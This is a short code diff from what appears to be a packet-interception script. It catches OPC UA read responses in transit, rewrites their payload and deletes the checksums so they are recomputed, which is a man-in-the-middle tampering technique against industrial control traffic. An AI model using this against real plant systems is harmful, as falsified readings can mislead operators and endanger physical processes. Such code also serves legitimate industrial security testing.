@@ -22,10 +22,9 @@ def alter_and_drop(pkt):
     if pl.haslayer("IP") and pl.haslayer("TCP"):
         opcua_data = extract_packet_data(pl)
         print(opcua_data.__str__())
-        if opcua_data.rsp_type == "Read":
+        if opcua_data.rsp_type == "ReadResponse":
             new_payload = alter_payload(opcua_data)
             pl[Raw].load = new_payload
-            #pl.getlayer(TCP).flags = 32
             del pl[TCP].chksum
             del pl[IP].chksum
             pkt.drop()
